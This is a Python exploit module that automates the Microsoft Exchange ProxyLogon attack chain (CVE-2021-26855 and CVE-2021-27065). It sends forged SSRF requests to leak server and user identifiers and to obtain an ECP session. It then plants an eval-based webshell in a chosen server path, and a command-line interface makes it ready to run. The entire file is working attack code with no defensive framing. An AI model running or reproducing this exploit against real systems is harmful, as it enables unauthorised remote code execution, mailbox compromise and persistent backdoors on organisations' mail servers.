# ----------------------------------------------------------------------------
# Proxylogon module.
# Automatically exploit Exchange server via Proxylogon vulnerability.
# Author: Gabriel Hévr
# ---------------------------------------------------------------------------

import json
import requests
import re
import logging
from string import ascii_letters
import random
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.basicConfig(format='[+] %(message)s', stream=sys.stdout, level=logging.INFO)


def evil_url(server_address):
    return server_address + "/ecp/" + random.choice(ascii_letters) + ".js"


class Proxylogon(object):
    def __init__(self, server_ip, email, password, path_to_webshell, proxy):
        self.session = requests.Session()
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) " \
                          "Chrome/97.0.4692.71 Safari/537.36 "
        self.proxies = None
        if proxy:
            self.proxies = {"https": proxy}
        self.server_ip = server_ip
        self.email = email
        self.webshell = 'http://AbrakaDabraka/#<script language="JScript" runat="server">function Page_Load(){' \
                        'eval(Request["'+str(password)+'"], "unsafe");}</script> '
        self.path_to_webshell = path_to_webshell
        self.user = email[:email.index("@")]
        self.domain = email[email.index("@") + 1:]
        self.FQDN = None
        self.legacy_DN = None
        self.mailbox_ID = None
        self.user_sid = None
        self.canary = None
        self.session_id = None
        self.OAB_Identity = None

    # this will cause 500 error, but the server accidentally leaks some information
    # get FQDN from X-FEServer header if possible
    def get_fqdn_rpc(self, server_address):
        req = requests.Request("GET", evil_url(server_address))
        req.cookies = self.session.cookies
        req.cookies["X-BEResource"] = "localhost#~1966966969"
        resp = self.session.send(req.prepare(), verify=False, proxies=self.proxies)
        fe_server = resp.headers['X-FEServer']
        if fe_server is None:
            logging.info("\u001b[31mUnable to get FQDN, pls provide it as parameter.\u001b[0m")
            raise Exception("Failed to get FQDN.")
        return fe_server + "." + self.domain

    def send_malicious_request(self, req):
        req.cookies = self.session.cookies
        req.cookies["X-BEResource"] = self.user + "@" + self.FQDN + ":444" + req.url + "#~1966966969"
        req.url = evil_url(self.server_ip)
        req.headers["User-Agent"] = self.user_agent
        return self.session.send(req.prepare(), verify=False, proxies=self.proxies)

    # ---------------------- #
    # CVE-2021-26855 EXPLOIT #
    # ---------------------- #

    # 0 step - get FQDN
    def step_0(self):
        logging.info("\u001b[33mGetting information about target machine\u001b[0m")
        self.FQDN = self.get_fqdn_rpc(self.server_ip)
        logging.info("FQDN = " + self.FQDN)

    # 1 step - get LegacyDN and mailboxId
    def step_1(self):
        logging.info("\u001b[33mExploiting autodiscover\u001b[0m")
        request = requests.Request("POST", "/autodiscover/autodiscover.xml")
        request.headers["Content-Type"] = "text/xml"
        request.data = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
            <Request>
                <EMailAddress>""" + self.email + """</EMailAddress>
        <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
            </Request>
        </Autodiscover>"""
        response = self.send_malicious_request(request)
        if response.status_code != 200:
            logging.info("\u001b[31mFAILED\u001b[0m")
            logging.debug(response.text)
            raise Exception("Exploiting Autodiscover failed.")
        legacy_DN = re.search('<LegacyDN>(.*)</LegacyDN>', response.text)
        mailbox_ID = re.search('<Server>(.*)</Server>', response.text)
        if (legacy_DN is None) or (mailbox_ID is None):
            logging.info("\u001b[31mFAILED\u001b[0m")
            logging.debug(response.text)
            raise Exception("Exploiting Autodiscover failed.")
        self.legacy_DN = legacy_DN.group(1)
        self.mailbox_ID = mailbox_ID.group(1)
        logging.info("legacyDN  = " + self.legacy_DN)
        logging.info("MailboxID = " + self.mailbox_ID)

    # 2 step - get SID of user (security identifier)
    def step_2(self):
        logging.info("\u001b[33mExploiting MAPI\u001b[0m")
        request = requests.Request("POST", "/mapi/emsmdb/?MailboxId=" + self.mailbox_ID)
        request.headers["X-RequestType"] = "Connect"
        request.headers["X-RequestID"] = "66666666-6666-6666-6666-666666666666"
        request.headers["Content-Type"] = "application/mapi-http"
        request.headers["X-ClientApplication"] = "Outlook/15.0.4815.1002"
        # "MAGIC" PAYLOAD
        # created with official docs:
        # https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxcmapihttp/330d636b-bf59-46e0-aaf7-08bf0e54e1d5
        # https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxcrpc/55251155-d6b7-43ad-9ffe-d4aea7e533dd
        # https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxcrpc/59d638fe-e63d-422a-b51d-6210b2155138
        flags = "\x00\x00\x00\x00"                  # request connection without admin privilege
        code_page = "\xe4\x04\x00\x00"              # rev: 04E4 == 1252 --> win-1252
        lcid_sort = "\x09\x04\x00\x00"              # 0409 == Locale 1033 "en-us"
        lcid_string = "\x09\x04\x00\x00"            # 0409 == Locale 1033 "en-us"
        auxiliary_buffer_size = "\x00\x00\x00\x00"  # buffer is empty
        payload = "\x00"+flags+code_page+lcid_sort+lcid_string+auxiliary_buffer_size
        request.data = self.legacy_DN + payload
        response = self.send_malicious_request(request)
        if response.status_code != 200:
            logging.info("\u001b[31mFAILED\u001b[0m")
            logging.debug(response.text)
            raise Exception("Exploiting Mapi failed")
        user_sid = re.search("with SID (.*) and MasterAccountSid", response.text)
        if user_sid is None:
            logging.info("\u001b[31mFAILED\u001b[0m")
            logging.debug(response.text)
            raise Exception("Exploiting Mapi failed")
        self.user_sid = user_sid.group(1)
        logging.info("User SID  = " + self.user_sid)

    # 3 step - Proxylogon to get canary
    # inspired from here: https://twitter.com/dragosr/status/1369982059045777408
    def step_3(self):
        logging.info("\u001b[33mExploiting Proxylogon\u001b[0m")
        request = requests.Request("POST", "/ecp/proxyLogon.ecp")
        request.headers['msExchLogonMailbox'] = self.user_sid
        request.data = '<r at="" ln=""><s>' + self.user_sid + '</s></r>'
        response = self.send_malicious_request(request)
        if response.status_code != 241:
            logging.info("\u001b[31mFAILED\u001b[0m")
            logging.debug(response.text)
            raise Exception("Exploiting Proxylogon failed")
        logging.info("\u001b[32mSuccessfully logged to ECP!\u001b[0m")
        self.canary = response.cookies["msExchEcpCanary"]
        self.session_id = response.cookies["ASP.NET_SessionId"]
        logging.info("Canary:" + self.canary)
        logging.info("session id:" + self.session_id)

    # ----------------------------- #
    # END OF CVE-2021-26855 EXPLOIT #
    # ----------------------------- #

    # ---------------------- #
    # CVE-2021-27065 EXPLOIT #
    # ---------------------- #

    # 4 step - find Virtual Directory
    def step_4(self):
        logging.info("\u001b[33mSearching for OAB Virtual Directory\u001b[0m")
        request = requests.Request("POST",
                                   "/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory"
                                   "&msExchEcpCanary=" + self.canary)
        request.headers["Content-Type"] = "application/json"
        request.headers["msExchLogonMailbox"] = self.user_sid
        request.data = ""
        response = self.send_malicious_request(request)
        if response.status_code != 200:
            logging.info("\u001b[31mFAILED\u001b[0m")
            logging.debug(response.text)
            raise Exception("GetObject failed")
        response = response.json()
        self.OAB_Identity = response["d"]["Output"][0]["Identity"]
        if not dir:
            logging.info("\u001b[31mFAILED\u001b[0m")
            logging.debug(response.text)
            raise Exception("GetObject failed")
        logging.info("OAB: " + str(self.OAB_Identity["DisplayName"]))

    # 5 step - inject code into the virtual directory settings
    def step_5(self):
        logging.info("\u001b[33mInjecting webshell into ExternalURL\u001b[0m")
        request = requests.Request("POST",
                                   "/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory"
                                   "&msExchEcpCanary=" + self.canary)
        request.headers["Content-Type"] = "application/json"
        request.headers["msExchLogonMailbox"] = self.user_sid
        request.data = json.dumps({"identity": self.OAB_Identity,
                                   "properties": {
                                       "Parameters": {
                                           "__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                           "ExternalUrl": self.webshell}}})
        response = self.send_malicious_request(request)
        if response.status_code != 200:
            logging.info("\u001b[31mFAILED\u001b[0m")
            logging.debug(response.text)
            raise Exception("SetObject failed")

    # 6 step - reset virtual directory
    def step_6(self):
        logging.info("\u001b[33mResetting OAB virtual directory\u001b[0m")
        request = requests.Request("POST",
                                   "/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory"
                                   "&msExchEcpCanary=" + self.canary)
        request.headers["Content-Type"] = "application/json"
        request.headers["msExchLogonMailbox"] = self.user_sid
        request.data = json.dumps({
            "identity": self.OAB_Identity,
            "properties": {
                "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                               "FilePathName": self.path_to_webshell}}})
        response = self.send_malicious_request(request)
        if response.status_code != 200:
            logging.info("\u001b[31mFAILED\u001b[0m")
            logging.debug(response.text)
            raise Exception("resetOAB failed")
        logging.info("\u001b[32mSuccessfully uploaded webshell!\u001b[0m")

    def exploit(self):
        self.step_0()
        self.step_1()
        self.step_2()
        self.step_3()
        self.step_4()
        self.step_5()
        self.step_6()


if __name__ == "__main__":
    import argparse
    example_usage = "Example: python3 proxylogon.py -t https://10.0.0.10" \
                    " -e MegaCorpAdmin@megacorp.local" \
                    " -l C:\\Program Files\\Microsoft\\Exchange" \
                    "Server\\V15\\FrontEnd\\HttpProxy\\ecp\\auth\\EvilCorp.aspx" \
                    " -x http://127.0.0.1:8080" \
                    " -s EvilCorp"

    parser = argparse.ArgumentParser(epilog=example_usage)
    parser.add_argument("-x", "--proxy", help="Proxy to use")
    required_named_args = parser.add_argument_group("Required named arguments")
    required_named_args.add_argument("-t", "--target", help="Exchange Server URL", required=True)
    required_named_args.add_argument("-e", "--email", help="Administrator email", required=True)
    required_named_args.add_argument("-l", "--location", help="Where to upload payload", required=True)
    required_named_args.add_argument("-s", "--password", help="Password for chopper", required=True)
    args = parser.parse_args()
    if not args.proxy:
        proxy = None
    else:
        proxy = args.proxy
    proxylogon = Proxylogon(args.target, args.email, args.password, args.location, proxy)
    proxylogon.exploit()